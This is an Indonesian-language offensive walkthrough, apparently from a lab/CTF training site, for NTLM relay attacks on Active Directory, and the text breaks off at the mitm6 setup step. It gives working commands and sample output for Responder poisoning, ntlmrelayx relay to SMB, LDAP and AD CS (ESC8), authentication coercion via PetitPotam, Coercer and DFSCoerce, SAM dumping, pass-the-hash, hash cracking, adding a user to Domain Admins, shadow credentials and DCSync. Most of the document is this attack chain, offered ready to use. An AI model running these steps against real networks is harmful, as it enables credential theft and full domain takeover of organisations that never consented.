Pertanyaan yang benar:

```text
1. Apa yang saya punya?
   │
   ├── NT hash?
   └── Net-NTLMv2?

2. Bisa saya relay?
   │
   ├── SMB signing?
   ├── LDAP signing?
   ├── target AD CS?
   └── target protocol?

3. Siapa identity yang sedang authenticate?
   │
   ├── low privilege
   ├── computer account
   ├── service account
   └── privileged account

4. Apa authorization identity tersebut?
   │
   ├── SMB admin?
   ├── LDAP write?
   ├── RBCD capability?
   └── certificate enrollment?

5. Apa jalur terbaik?
   │
   ├── Relay
   ├── Crack
   ├── PTH
   ├── AD CS
   └── RBCD
```

Dan kalimat yang harus benar-benar tertanam:

> **NTLM hash adalah secret/credential yang dapat digunakan untuk Pass-the-Hash. Net-NTLMv2 adalah response hasil challenge-response yang biasanya Anda capture dari network; ia bukan NT hash dan tidak dapat langsung dipakai sebagai `-hashes` untuk PTH.**

> **Responder digunakan untuk poisoning/capture. `ntlmrelayx` digunakan untuk relay. Saat keduanya dipakai bersama dalam relay workflow, Responder SMB/HTTP harus dimatikan agar `ntlmrelayx` dapat menerima authentication pada port yang dibutuhkan.**

> **Relay berhasil hanya berarti authentication berhasil diteruskan. Impact sebenarnya ditentukan oleh authorization dari identity yang direlay dan security policy target.**

---

# [🔁 Workflow 41 — NTLM Relay](/docs/ntlm-relay) — Complete Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.
> 
> **Prerequisites:** SMB Signing check sudah dilakukan (dari `[05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba)`), atau sudah dalam AD environment dari `[🏰 35 — Active Directory Initial Enumeration Workflow](/docs/ad-initial-enumeration)`

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export TARGET="10.10.11.200"          # Target IP
export DC_IP="10.10.11.200"           # Domain Controller IP
export CA_IP="10.10.11.201"           # Certificate Authority IP (jika ada)
export ATTACKER_IP="10.10.14.5"       # IP tun0 kamu (VPN HTB/THM)
export DOMAIN="CORP.LOCAL"            # Domain name
export USERNAME=""                     # Username jika sudah punya
export PASSWORD=""                     # Password jika sudah punya
export LHOST="10.10.14.5"
export LPORT="4444"

# Buat direktori kerja
mkdir -p ~/ntlm_relay/{loot,targets,logs,creds,certs}
cd ~/ntlm_relay

# Setup tmux (SANGAT DIREKOMENDASIKAN — butuh 3 terminal bersamaan)
tmux new -s relay
# Ctrl+B lalu % → Split Vertikal
# Ctrl+B lalu " → Split Horizontal
# Ctrl+B lalu Arrow Key → Pindah panel

echo "[*] Environment ready. Target: $TARGET | Attacker: $ATTACKER_IP"
```

**Layout terminal yang direkomendasikan:**

text

```
┌─────────────────────────────────┬─────────────────────────────────┐
│ TERMINAL 1                      │ TERMINAL 2                      │
│ ntlmrelayx (Relay listener)     │ Responder (Poisoner)            │
│                                 │ SMB=Off, HTTP=Off               │
├─────────────────────────────────┴─────────────────────────────────┤
│ TERMINAL 3                                                        │
│ Coercion / Monitoring / Analysis                                  │
└───────────────────────────────────────────────────────────────────┘
```

---

## ═══════════════════════════════════════

## FASE 0: RECON — CEK SIGNING STATUS

## ═══════════════════════════════════════

> **Tujuan:** Tentukan apakah relay mungkin dilakukan sebelum setup apapun. Ini adalah gate paling penting.

### Langkah 0.1 — Cek SMB Signing di Seluruh Network

Bash

```
# Command 1: NetExec — paling cepat, sekaligus generate relay list
nxc smb 10.10.11.0/24

# Command 2: Generate target list otomatis (host dengan signing disabled)
nxc smb 10.10.11.0/24 --gen-relay-list ~/ntlm_relay/targets/smb_targets.txt

# Command 3: Nmap untuk konfirmasi detail
nmap --script smb2-security-mode -p 445 10.10.11.0/24 -oN ~/ntlm_relay/logs/smb_signing.txt

# Command 4: Jika hanya cek 1 target
nxc smb $TARGET
```

**OUTPUT BERHASIL ✅ — signing:False (RELAY POSSIBLE):**

text

```
SMB  10.10.11.200  445  FILE01   [*] Windows Server 2019 x64
SMB  10.10.11.200  445  FILE01   [+] signing:False
SMB  10.10.11.100  445  WS01     [+] signing:False
SMB  10.10.11.10   445  DC01     [+] signing:True
```

**Cara baca output:**

|Host|signing|Artinya|Tindakan|
|---|---|---|---|
|FILE01|False|Relay candidate ✅|Masuk ke file targets.txt|
|WS01|False|Relay candidate ✅|Masuk ke file targets.txt|
|DC01|True|SMB relay blocked ❌|Cek LDAP relay, AD CS, atau MITM6|

➡️ Jika ada host dengan `signing:False` → lanjut ke **Langkah 0.2**  
➡️ Jika SEMUA host `signing:True` → lanjut ke **Langkah 0.3 (LDAP Check)**

**OUTPUT GAGAL ❌ — Semua signing:True:**

text

```
SMB  10.10.11.10   445  DC01   [+] signing:True
SMB  10.10.11.200  445  FILE01 [+] signing:True
```

➡️ SMB relay standar tidak bisa. Tetapi jangan menyerah — lanjut ke **Langkah 0.3**

---

### Langkah 0.2 — Verifikasi Target List

Bash

```
# Lihat isi target list yang digenerate
cat ~/ntlm_relay/targets/smb_targets.txt
```

**OUTPUT BERHASIL ✅:**

text

```
10.10.11.200
10.10.11.100
10.10.11.150
```

Bash

```
# Verifikasi setiap target masih up
nxc smb ~/ntlm_relay/targets/smb_targets.txt
```

➡️ Lanjut ke **Fase 1 (Configure Responder)**

**OUTPUT GAGAL ❌ — File kosong:**

text

```
(file kosong)
```

➡️ Tidak ada target SMB relay. Lanjut ke **Langkah 0.3**

---

### Langkah 0.3 — Cek LDAP Signing (Fallback jika SMB Signing Enabled)

Bash

```
# Method 1: NetExec LDAP (paling reliable)
nxc ldap $DC_IP -u '' -p ''

# Method 2: ldapsearch manual
ldapsearch -x -H "ldap://$DC_IP" -b "" -s base "(objectclass=*)" 2>&1 | head -20

# Method 3: Nmap
nmap --script ldap-rootdse -p 389 $DC_IP

# Method 4: Impacket CheckLDAPStatus (jika tersedia)
python3 /opt/impacket/examples/CheckLDAPStatus.py -dc-ip $DC_IP -domain $DOMAIN
```

**OUTPUT BERHASIL ✅ — LDAP Signing NOT Enforced (RootDSE accessible):**

text

```
LDAP 10.10.11.10  389  DC01  [*] dc=corp,dc=local
LDAP 10.10.11.10  389  DC01  [+] Anonymous bind OK
```

➡️ LDAP relay possible! Lanjut ke **Fase 4 (LDAP Relay)**

**OUTPUT GAGAL ❌ — strongerAuthRequired:**

text

```
LDAP 10.10.11.10  389  DC01  [-] Error: strongerAuthRequired
```

**Cara baca:** LDAP Signing enforced. Standard LDAP relay blocked.

➡️ Cek AD CS: lanjut ke **Langkah 0.4**

---

### Langkah 0.4 — Cek AD CS Web Enrollment (ESC8)

Bash

```
# Cek apakah endpoint ada
curl -k -i "http://$CA_IP/certsrv/"
curl -k -i "https://$CA_IP/certsrv/"

# Jika CA IP tidak diketahui, cari dulu
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -M adcs 2>/dev/null
certipy find -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -dc-ip $DC_IP -stdout 2>/dev/null | grep -i "web enrollment\|ESC8\|http"
```

**OUTPUT BERHASIL ✅ — Web Enrollment accessible:**

text

```
HTTP/1.1 401 Unauthorized
WWW-Authenticate: NTLM
Server: Microsoft-IIS/10.0
```

➡️ ESC8 possible! Lanjut ke **Fase 5 (AD CS Relay)**

**OUTPUT GAGAL ❌ — Connection refused / 404:**

text

```
curl: (7) Failed to connect to 10.10.11.201 port 80: Connection refused
```

➡️ Tidak ada AD CS endpoint. Coba **MITM6** (Fase 6) atau **Responder Capture** (Fase 7)

---

## ═══════════════════════════════════════

## FASE 1: CONFIGURE RESPONDER FOR RELAY

## ═══════════════════════════════════════

> **PENTING:** Responder harus dikonfigurasi dengan benar SEBELUM menjalankan ntlmrelayx. Salah konfigurasi = relay tidak bekerja.

### Langkah 1.1 — Edit Responder.conf

Bash

```
# Buka config file
sudo nano /etc/responder/Responder.conf

# ATAU langsung edit dengan sed (lebih cepat)
sudo sed -i 's/^SMB = On/SMB = Off/' /etc/responder/Responder.conf
sudo sed -i 's/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf

# Verifikasi perubahan
grep -E "^SMB|^HTTP" /etc/responder/Responder.conf
```

**OUTPUT BERHASIL ✅:**

text

```
SMB = Off
HTTP = Off
LDAP = On
LLMNR = On
NBTNS = On
```

**KENAPA SMB dan HTTP harus Off?**

text

```
JIKA Responder SMB = On:
  Victim → authenticate → Responder (CAPTURED, tidak diteruskan)
  ntlmrelayx tidak mendapat traffic

SEHARUSNYA:
  Victim → authenticate → ntlmrelayx → TARGET (RELAYED)
```

**OUTPUT SALAH ❌ — SMB masih On:**

text

```
SMB = On
HTTP = On
```

➡️ Edit ulang. Jika dibiarkan On, relay tidak akan bekerja karena Responder akan meng-handle authentication sebelum ntlmrelayx bisa relay.

---

### Langkah 1.2 — Cek Port Conflict

Bash

```
# Pastikan tidak ada service yang sudah pakai port 445 dan 80
sudo ss -ltnp | grep -E ':445|:80'

# Jika ada conflict, matikan service tersebut
sudo systemctl stop smbd 2>/dev/null
sudo systemctl stop apache2 2>/dev/null
sudo systemctl stop nginx 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Port kosong:**

text

```
(tidak ada output)
```

**OUTPUT GAGAL ❌ — Port occupied:**

text

```
LISTEN  0  50  0.0.0.0:445  0.0.0.0:*  users:(("smbd",pid=1234))
```

➡️ Matikan service yang menggunakan port tersebut sebelum lanjut.

---

## ═══════════════════════════════════════

## FASE 2: SMB → SMB RELAY (SETUP & EXECUTE)

## ═══════════════════════════════════════

> **Prasyarat:** Ada host dengan `signing:False` dari Fase 0

### Langkah 2.1 — Jalankan ntlmrelayx (Terminal 1)

Bash

```
# Option A: Multi-target (paling umum)
sudo ntlmrelayx.py \
    -tf ~/ntlm_relay/targets/smb_targets.txt \
    -smb2support \
    -l ~/ntlm_relay/loot

# Option B: Single target
sudo ntlmrelayx.py \
    -t "smb://$TARGET" \
    -smb2support \
    -l ~/ntlm_relay/loot

# Option C: Dengan command execution (jika ingin langsung execute)
sudo ntlmrelayx.py \
    -tf ~/ntlm_relay/targets/smb_targets.txt \
    -smb2support \
    -c "whoami"

# Option D: Interactive shell mode
sudo ntlmrelayx.py \
    -tf ~/ntlm_relay/targets/smb_targets.txt \
    -smb2support \
    -i
```

**OUTPUT BERHASIL ✅ — ntlmrelayx startup normal:**

text

```
[*] Impacket v0.12.0.dev1 - Copyright Fortra, LLC
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Servers started, waiting for connections...
```

**OUTPUT GAGAL ❌ — Address already in use:**

text

```
OSError: [Errno 98] Address already in use
```

➡️ Ada service di port 445/80. Kembali ke Langkah 1.2 dan matikan service tersebut.

**OUTPUT GAGAL ❌ — Permission denied:**

text

```
PermissionError: [Errno 1] Operation not permitted
```

➡️ Jalankan dengan `sudo`.

---

### Langkah 2.2 — Jalankan Responder (Terminal 2)

Bash

```
# Cek interface yang benar dulu
ip addr show tun0  # VPN
ip addr show eth0  # LAN

# Jalankan Responder (poisoning mode)
sudo responder -I tun0 -rdwv

# Jika menggunakan eth0
sudo responder -I eth0 -rdwv
```

**Flag Responder:**

|Flag|Fungsi|
|---|---|
|`-I`|Interface|
|`-r`|Enable wredir responses|
|`-d`|DHCP poisoning|
|`-w`|WPAD|
|`-v`|Verbose|

**OUTPUT BERHASIL ✅ — Responder running:**

text

```
[*] Current Session variables:
[*]   Responder Machine Name     [WIN-ABCD1234]
[*]   Responder Domain Name      [CORP.LOCAL]
[*]   Responder DCE-RPC Port     [45679]
[+] Listening for events...
```

**OUTPUT GAGAL ❌ — Interface not found:**

text

```
Error: Interface not found.
```

➡️ Cek nama interface dengan `ip addr`. Ganti `tun0` dengan nama interface yang benar.

---

### Langkah 2.3 — Trigger Authentication (Terminal 3)

**Opsi A: Passive (tunggu)**

Bash

```
# Tunggu victim melakukan name resolution yang salah
# Ini terjadi secara natural di network aktif
# Monitor output di Terminal 1 dan 2
watch -n 5 'cat ~/ntlm_relay/loot/*.txt 2>/dev/null | head -50'
```

**Opsi B: Active Coercion (untuk CTF/lab)**

Bash

```
# Method 1: PetitPotam (MS-EFSRPC)
git clone https://github.com/topotam/PetitPotam.git /tmp/PetitPotam 2>/dev/null
python3 /tmp/PetitPotam/PetitPotam.py "$ATTACKER_IP" "$TARGET"

# Method 2: PrinterBug (MS-RPRN) — butuh valid creds
python3 /opt/impacket/examples/rpcdump.py $TARGET | grep -i "spoolss\|spooler"
# Jika Spooler aktif:
python3 /tmp/SpoolSample/SpoolSample.py $TARGET $ATTACKER_IP

# Method 3: Coercer (all-in-one, butuh creds)
coercer coerce \
    -l "$ATTACKER_IP" \
    -t "$TARGET" \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    -d "$DOMAIN"

# Method 4: DFSCoerce
python3 /tmp/DFSCoerce/dfscoerce.py -u "$USERNAME" -p "$PASSWORD" "$ATTACKER_IP" "$TARGET"
```

**OUTPUT BERHASIL ✅ — Authentication terdeteksi di Terminal 1:**

text

```
[*] SMBD: Received connection from 10.10.11.200
[*] SMBD: Received authentication request from CORP\FILE01$
[*] Authenticating against smb://10.10.11.100 as CORP\FILE01$
[*] SMB Client: authenticating
[*] ADMIN$ is accessible
[+] Relay successful
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
svc_backup:1001:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::
```

➡️ **JACKPOT! SAM hashes didapat.** Lanjut ke **Langkah 2.4**

**OUTPUT BERHASIL ✅ — Relay sukses tapi bukan Admin:**

text

```
[+] Relay successful
[-] Not an Administrator
[*] No SAM dump
```

**Artinya:** Authentication berhasil di-relay tapi user yang direlay bukan local admin. Authentication ≠ Authorization.

➡️ Coba target berbeda, atau pivot ke LDAP relay. Lanjut ke **Fase 4**

**OUTPUT GAGAL ❌ — STATUS_ACCESS_DENIED:**

text

```
[-] SMB SessionError: STATUS_ACCESS_DENIED
```

**Kemungkinan penyebab:**

- Target ternyata butuh signing (cek ulang)
- User yang direlay tidak punya akses
- UAC blocking

Bash

```
# Cek ulang signing status target spesifik
nxc smb 10.10.11.100 --verbose
```

**OUTPUT GAGAL ❌ — Tidak ada connection ke ntlmrelayx:**

text

```
[*] Servers started, waiting for connections...
(diam)
```

➡️ Authentication tidak terpicu. Pastikan:

1. Responder running dan poisoning berjalan
2. Ada traffic di network (victim melakukan name resolution)
3. Untuk lab: trigger manual dengan coercion

---

### Langkah 2.4 — Simpan dan Gunakan Hashes

Bash

```
# Simpan hashes ke file
cat ~/ntlm_relay/loot/*.txt >> ~/ntlm_relay/creds/sam_hashes.txt

# Atau cek loot directory
ls -la ~/ntlm_relay/loot/
cat ~/ntlm_relay/loot/*

# Format hash yang didapat:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::
# USERNAME:RID:LMHASH:NTHASH:::

# Ekstrak hanya NT hash untuk dipakai
cat ~/ntlm_relay/creds/sam_hashes.txt | cut -d: -f4
```

**KRITIS — Pahami perbedaan hash:**

text

```
NT Hash (dari SAM dump):
  fc525c9683e8fe067095ba2ddc971881
  → Bisa langsung untuk Pass-the-Hash!

Net-NTLMv2 (dari Responder capture):
  Administrator::CORP:1122334455667788:a1b2c3...:0101000000...
  → TIDAK bisa PTH langsung! Harus di-crack atau di-relay.
```

Bash

```
# Pass-the-Hash langsung jika relay dapat NT hash
export NTLM_HASH="aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881"

# Validasi PTH
nxc smb $TARGET -u "Administrator" -H "$NTLM_HASH"
nxc smb 10.10.11.0/24 -u "Administrator" -H "$NTLM_HASH" --local-auth
```

**OUTPUT BERHASIL ✅ — PTH valid:**

text

```
SMB  10.10.11.200  445  FILE01  [+] CORP\Administrator:fc525c... (Pwn3d!)
```

➡️ Admin akses didapat! Lanjut ke **Fase 8 (Post-Exploitation)**

**OUTPUT BERHASIL ✅ — PTH valid tapi bukan admin:**

text

```
SMB  10.10.11.200  445  FILE01  [+] CORP\svc_backup:a87f3a...
```

➡️ User valid, bukan admin lokal. Test ke service lain. Lanjut ke **Cross-Service Testing** di akhir dokumen.

---

### Langkah 2.5 — Crack NT Hash (Alternatif / Backup)

Bash

```
# Hashcat mode 1000 untuk NT hash
hashcat -m 1000 ~/ntlm_relay/creds/sam_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    -o ~/ntlm_relay/creds/cracked_nt.txt

# John alternatif
john ~/ntlm_relay/creds/sam_hashes.txt \
    --wordlist=/usr/share/wordlists/rockyou.txt \
    --format=NT

# Dengan rules (lebih powerful)
hashcat -m 1000 ~/ntlm_relay/creds/sam_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule
```

**OUTPUT BERHASIL ✅:**

text

```
fc525c9683e8fe067095ba2ddc971881:Password123!
a87f3a337d73085c45f9416be5787d86:Backup2023!
```

Bash

```
# Simpan credentials
echo "Administrator:Password123!" >> ~/ntlm_relay/creds/found_creds.txt
echo "svc_backup:Backup2023!" >> ~/ntlm_relay/creds/found_creds.txt
```

**OUTPUT GAGAL ❌ — Tidak crack:**

text

```
Session..........: hashcat
Status...........: Exhausted
```

➡️ Password kuat atau tidak ada di wordlist. Gunakan hash untuk PTH langsung tanpa perlu crack. Atau coba wordlist lebih besar:

Bash

```
# Gunakan wordlist lebih comprehensive
# Search: "site:github.com wordlist large password"
hashcat -m 1000 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
```

---

## ═══════════════════════════════════════

## FASE 3: RESPONDER CAPTURE + CRACK (Fallback)

## ═══════════════════════════════════════

> **Gunakan Fase ini jika:** Relay tidak berhasil (signing enabled), atau tidak ada relay target, tapi masih bisa capture Net-NTLMv2

### Langkah 3.1 — Switch ke Capture Mode

Bash

```
# Edit Responder.conf untuk capture mode (KEBALIKAN dari relay mode!)
sudo sed -i 's/^SMB = Off/SMB = On/' /etc/responder/Responder.conf
sudo sed -i 's/^HTTP = Off/HTTP = On/' /etc/responder/Responder.conf

# Verifikasi
grep -E "^SMB|^HTTP" /etc/responder/Responder.conf
```

**OUTPUT BERHASIL ✅:**

text

```
SMB = On
HTTP = On
```

Bash

```
# Jalankan Responder capture mode
sudo responder -I tun0 -rdwv
```

**OUTPUT BERHASIL ✅ — Net-NTLMv2 tertangkap:**

text

```
[SMB] NTLMv2-SSP Client   : 10.10.11.200
[SMB] NTLMv2-SSP Username : CORP\diana
[SMB] NTLMv2-SSP Hash     : diana::CORP:1122334455667788:a1b2c3d4e5f6789abc:01010000...
```

Bash

```
# Simpan hash
ls /opt/Responder/logs/ 2>/dev/null || ls /usr/share/responder/logs/ 2>/dev/null
cat /opt/Responder/logs/SMB-NTLMv2-SSP-*.txt 2>/dev/null
```

---

### Langkah 3.2 — Crack Net-NTLMv2

Bash

```
# PENTING: Net-NTLMv2 pakai mode 5600, BUKAN 1000!
hashcat -m 5600 /opt/Responder/logs/SMB-NTLMv2-SSP-*.txt \
    /usr/share/wordlists/rockyou.txt \
    -o ~/ntlm_relay/creds/cracked_netntlm.txt

# John alternatif
john /opt/Responder/logs/SMB-NTLMv2-SSP-*.txt \
    --wordlist=/usr/share/wordlists/rockyou.txt

# Dengan rules
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**OUTPUT BERHASIL ✅:**

text

```
diana::CORP:1122...:a1b2...:0101...:Welcome2023!
```

Bash

```
# Validasi password yang didapat
export USER="diana"
export PASS="Welcome2023!"
nxc smb $TARGET -u "$USER" -p "$PASS"
```

**OUTPUT GAGAL ❌ — Tidak crack:**

text

```
Status...........: Exhausted
```

➡️ Password tidak ada di wordlist. Coba:

Bash

```
# 1. Wordlist lebih besar
find / -name "*.txt" -path "*/wordlist*" 2>/dev/null | head -10

# 2. Custom wordlist berdasarkan info yang sudah dikumpulkan
cewl http://$TARGET -m 6 -w custom_wordlist.txt 2>/dev/null

# 3. Rule-based attack
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# Google search tip:
# "hashcat NTLMv2 crack rules" untuk rule terbaik
# "site:github.com biggest password wordlist"
```

---

## ═══════════════════════════════════════

## FASE 4: SMB → LDAP RELAY (Advanced)

## ═══════════════════════════════════════

> **Gunakan Fase ini jika:** LDAP Signing tidak enforced (dari Fase 0), atau sebagai alternatif ketika SMB relay berhasil tapi butuh AD manipulation

### Langkah 4.1 — Setup LDAP Relay

Bash

```
# Pastikan Responder SMB=Off, HTTP=Off (dari Fase 1)

# Option A: Basic LDAP relay (enumerate AD)
sudo ntlmrelayx.py \
    -t "ldap://$DC_IP" \
    -smb2support

# Option B: Escalate user (privilege escalation di AD)
sudo ntlmrelayx.py \
    -t "ldap://$DC_IP" \
    -smb2support \
    --escalate-user "$USERNAME"

# Option C: RBCD attack (delegate access)
sudo ntlmrelayx.py \
    -t "ldap://$DC_IP" \
    -smb2support \
    --delegate-access

# Option D: Shadow Credentials
sudo ntlmrelayx.py \
    -t "ldap://$DC_IP" \
    -smb2support \
    --shadow-credentials

# Option E: Add computer account
sudo ntlmrelayx.py \
    -t "ldap://$DC_IP" \
    -smb2support \
    --add-computer "FAKEMACHINE" "FakePass123!"
```

---

### Langkah 4.2 — Trigger Authentication untuk LDAP Relay

Bash

```
# Sama seperti Fase 2 — jalankan Responder + coercion
# Terminal 2: Responder (SMB=Off, HTTP=Off)
sudo responder -I tun0 -rdwv

# Terminal 3: Coercion
python3 /tmp/PetitPotam/PetitPotam.py "$ATTACKER_IP" "$DC_IP"
```

**OUTPUT BERHASIL ✅ — LDAP bind berhasil:**

text

```
[*] SMBD: Received connection from 10.10.11.10
[*] SMBD: Received authentication request from CORP\DC01$
[*] Authenticating against ldap://10.10.11.10 as CORP\DC01$
[*] LDAP bind successful
[*] Enumerating LDAP information
[+] User enumeration: 15 users found
```

**OUTPUT BERHASIL ✅ — Escalate user sukses:**

text

```
[*] LDAP attack starting
[+] Added CORP\diana to Domain Admins
```

➡️ User diana sekarang Domain Admin! Verifikasi:

Bash

```
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD"
# Jika (Pwn3d!) → berhasil

# Langsung dump NTDS
impacket-secretsdump "$USERNAME:$PASSWORD@$DC_IP"
```

**OUTPUT BERHASIL ✅ — RBCD dikonfigurasi:**

text

```
[*] Delegation rights modified successfully!
[*] FAKEMACHINE can now impersonate users on DC01 via S4U2Proxy
```

➡️ Lanjut ke `[🔐 Workflow 39 — Active Directory Delegation](/docs/ad-delegation)` untuk eksploitasi RBCD dengan S4U2Self/S4U2Proxy

**OUTPUT BERHASIL ✅ — Shadow Credentials ditambahkan:**

text

```
[*] msDS-KeyCredentialLink attribute updated for DC01$
[*] KeyCredential: ...
[*] DeviceID: ...
```

Bash

```
# Gunakan shadow credentials untuk mendapat TGT
certipy shadow auto -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -account "DC01$" -dc-ip $DC_IP
```

**OUTPUT GAGAL ❌ — LDAP bind failed / strongerAuthRequired:**

text

```
[-] Error: strongerAuthRequired
[-] LDAP bind failed
```

➡️ LDAP Signing enforced. Coba LDAPS:

Bash

```
sudo ntlmrelayx.py \
    -t "ldaps://$DC_IP" \
    -smb2support
```

**OUTPUT GAGAL ❌ — LDAPS channel binding:**

text

```
[-] LDAPS NTLM authentication rejected (channel binding enforced)
```

➡️ LDAPS dengan channel binding. Tidak bisa LDAP relay. Coba AD CS (Fase 5) atau MITM6 (Fase 6).

---

## ═══════════════════════════════════════

## FASE 5: RELAY KE AD CS — ESC8

## ═══════════════════════════════════════

> **Gunakan Fase ini jika:** AD CS Web Enrollment accessible (dari Fase 0.4)

### Langkah 5.1 — Verifikasi AD CS Endpoint

Bash

```
# Cek endpoint HTTP
curl -v -k "http://$CA_IP/certsrv/" 2>&1 | grep -E "HTTP|WWW-Authenticate|Server"

# Cek endpoint HTTPS
curl -v -k "https://$CA_IP/certsrv/" 2>&1 | grep -E "HTTP|WWW-Authenticate|Server"
```

**OUTPUT BERHASIL ✅ — Endpoint ada dan butuh NTLM auth:**

text

```
< HTTP/1.1 401 Unauthorized
< WWW-Authenticate: NTLM
< Server: Microsoft-IIS/10.0
```

**Output** `401 Unauthorized` dengan `WWW-Authenticate: NTLM` = NORMAL dan BAGUS. Artinya endpoint ada dan siap di-relay.

---

### Langkah 5.2 — Setup AD CS Relay

Bash

```
# Terminal 1: ntlmrelayx ke AD CS
sudo ntlmrelayx.py \
    -t "http://$CA_IP" \
    --adcs \
    --template "DomainController"

# Jika target adalah user certificate (bukan DC)
sudo ntlmrelayx.py \
    -t "http://$CA_IP" \
    --adcs \
    --template "User"

# Terminal 2: Responder (SMB=Off, HTTP=Off!)
sudo responder -I tun0 -rdwv
```

---

### Langkah 5.3 — Trigger Coercion dari DC

Bash

```
# KRITIS: Coerce DC untuk authenticate ke kita
# Ini akan mendapat DC machine account certificate
python3 /tmp/PetitPotam/PetitPotam.py "$ATTACKER_IP" "$DC_IP"

# Alternatif
coercer coerce -l "$ATTACKER_IP" -t "$DC_IP" -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN"
```

**OUTPUT BERHASIL ✅ — Certificate diterbitkan:**

text

```
[*] HTTPD(80): Received connection from 10.10.11.10
[*] HTTPD(80): Client requested path: /certsrv/certfnsh.asp
[*] HTTPD: Received NTLM authentication from CORP\DC01$
[*] HTTPD: Authenticating against http://10.10.11.201
[*] Trying to relay credentials to AD CS
[*] Requesting certificate from CA
[+] Certificate issued successfully
[*] Saving certificate to 'DC01$.pfx'
```

Bash

```
# Simpan certificate
cp DC01\$.pfx ~/ntlm_relay/certs/DC01.pfx
ls -la ~/ntlm_relay/certs/
```

---

### Langkah 5.4 — Gunakan Certificate untuk Mendapat TGT

Bash

```
# Sync waktu dengan DC (PENTING untuk Kerberos)
sudo ntpdate -u $DC_IP 2>/dev/null || sudo rdate -n $DC_IP 2>/dev/null
date

# Gunakan certificate untuk PKINIT authentication
certipy auth \
    -pfx ~/ntlm_relay/certs/DC01.pfx \
    -dc-ip $DC_IP
```

**OUTPUT BERHASIL ✅ — TGT didapat:**

text

```
[*] Using principal: dc01$@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'dc01$.ccache'
[*] Trying to retrieve NT hash for 'dc01$'
[*] Got hash for 'dc01$@corp.local': aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
```

Bash

```
# Export ccache untuk digunakan
export KRB5CCNAME="$PWD/dc01$.ccache"
klist  # Verifikasi ticket

# DCSync menggunakan machine account ticket
impacket-secretsdump -k -no-pass -dc-ip $DC_IP "$DOMAIN/DC01\$@DC01.$DOMAIN"
```

**OUTPUT BERHASIL ✅ — DCSync berhasil:**

text

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482b2b2b27a7a6a8e91e0a6692:::
diana:1104:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

➡️ Domain fully compromised! Lanjut ke **Fase 8 (Post-Exploitation)**

**OUTPUT GAGAL ❌ — KRB_AP_ERR_SKEW:**

text

```
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Bash

```
# Sync waktu dengan DC
sudo ntpdate -u $DC_IP
# Atau manual
sudo date -s "$(ssh user@$DC_IP 'date' 2>/dev/null)" 2>/dev/null
```

**OUTPUT GAGAL ❌ — Certificate mapping issue:**

text

```
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP
```

➡️ PKINIT tidak dikonfigurasi atau certificate mapping bermasalah. Coba template berbeda, atau cek:

Bash

```
# Google: "certipy PKINIT KDC_ERR_PADATA_TYPE_NOSUPP fix"
# Kemungkinan: DC tidak support PKINIT, coba --ldap-shell atau metode lain
certipy auth -pfx DC01.pfx -dc-ip $DC_IP -ldap-shell
```

---

## ═══════════════════════════════════════

## FASE 6: MITM6 — IPv6 RELAY

## ═══════════════════════════════════════

> **Gunakan Fase ini jika:** SMB signing enabled, LDAP signing enforced, tapi network menggunakan IPv6

### Langkah 6.1 — Cek IPv6 di Network

Bash

```
# Cek apakah target network punya IPv6
ping6 -c 3 $DC_IP 2>/dev/null
nmap -6 -sV $DC_IP 2>/dev/null | head -20

# Cek interface IPv6 lokal
ip -6 addr show tun0 2>/dev/null
ip -6 addr show eth0 2>/dev/null
```

**OUTPUT BERHASIL ✅ — IPv6 aktif:**

text

```
tun0: inet6 fe80::1234:5678/64 scope link
```

---

### Langkah 6.2 — Setup MITM6 + ntlmrelayx

Bash

```
# Install mitm6 jika belum ada
pip3 install mitm6 2>/dev/null || pip install mitm6

# Terminal 1: Jalankan ntlmrelayx dengan flag -6
sudo ntlmrelayx.py \
    -6 \
    -t "ldap://$DC_IP" \
    -smb2support \
    --delegate-access

# Atau relay ke AD CS via IPv6
sudo ntlmrelayx.py \
    -6 \
    -t "http://$CA_IP" \
    --adcs \
    --template "DomainController"

# Terminal 2: Jalankan mitm6
